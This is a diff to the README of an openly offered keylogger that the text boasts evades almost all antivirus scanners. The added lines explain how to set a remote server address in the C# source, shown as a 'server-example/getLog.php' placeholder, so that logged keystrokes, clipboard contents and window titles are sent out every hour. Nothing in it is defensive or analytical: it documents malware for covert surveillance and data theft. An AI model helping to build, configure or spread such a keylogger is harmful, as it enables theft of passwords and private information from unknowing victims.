@@ -14,11 +14,18 @@ This keylogger is undetected by 99% of the anti-virus on [**virustotal**](https:
 
 Download the lastest release and install it.
 
+You can edit th lines 18-19 to add your server where send logs :
+```Csharp
+string serverLink = "http://server-example/getLog.php";
+string serverArg = "log";
+```
+
 ## Features
 
 * Log keys
 * Log the clipboard
-* Log the window titles
+* Log window titles
+* Send logs to a server each hour
 
 ## Logs example
 
